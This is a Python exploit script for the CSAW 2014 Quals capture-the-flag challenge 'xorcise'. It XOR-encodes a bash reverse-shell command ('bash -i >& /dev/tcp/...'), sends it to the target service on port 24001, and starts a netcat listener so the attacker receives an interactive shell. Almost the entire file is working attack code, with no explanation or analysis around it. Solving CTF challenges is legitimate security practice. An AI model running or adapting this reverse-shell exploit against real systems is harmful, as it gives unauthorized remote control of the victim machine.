#!/usr/bin/env python
# 
# Exploit for CSAW 2014 Quals Challenge: xorcise
# requires netcat as 'nc' 
#

import os
import sys
import socket
import struct
import binascii

class xorcise_exploit:
    def __init__(self, connect_back_host):
        self.command = "bash -i >& /dev/tcp/%s/%s 0>&1" % connect_back_host
        self.key = "\x00\x00\x00\x00\x00\x13\xF4\x16"
        self.length = 129
        self.xor_bit_mask=0x8F
     
    def build(self):
        plaintext = self.command
        plaintext = plaintext.ljust(128, "\x00")
        packet = self.encrypt(plaintext)
        return packet

    def encrypt(self, data):
        packet = ''
        packet += struct.pack("B", self.length)
        packet += self.key[:8].ljust(8,"\x00")
        amount = self.length
        if amount > len(data):
            amount = len(data)
        for i in range(0,amount):
            crypt=ord(data[i])^ord(self.key[i % 8])^self.xor_bit_mask
            packet += chr(crypt)
        return packet

def usage(program, opts):
    print "usage: %s <arguments>" % program
    for arg in opts:
        print "\t%s\t%s" % (arg, opts[arg])
    print "\n"

# main function
if __name__ == "__main__":
    print "\n -- CSAW 2014 Quals: xorcise exploit --\n"
    argc = len(sys.argv)
    error = ''
    opts = {'-h':'target_host_ip', 
            '-c':'connect_back_ip', 
            '-p':'connect_back_port'}
    args={}
    for i in range(1, argc):
        if sys.argv[i] in opts:
            try:
                args[opts[sys.argv[i]]]=sys.argv[i+1]
                opts.pop(sys.argv[i])
                continue
            except:
                error+='failed to set %s\n' % opts[sys.argv[i]]

    for missing in opts.values():
        error += 'failed to set %s\n' % missing

    if len(error) > 0:
        print error
        usage(sys.argv[0], opts)
        sys.exit(1)

    target_host = (args["target_host_ip"], 24001)
    print "+ targeting host: %s:%i" % target_host

    connect_back_host = (args["connect_back_ip"], args["connect_back_port"])
    print "+ connect back host: %s:%s" % connect_back_host

    print "+ constructing exploit data"
    exploit = xorcise_exploit(connect_back_host)
    packet = exploit.build()

    print "+ connecting..."
    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    sd.connect(target_host) 
    
    print "+ sending packet"
    sd.send(packet)

    print "+ shellparty" 
    os.system("nc -l %s" % args["connect_back_port"])
        
    sys.exit(0)
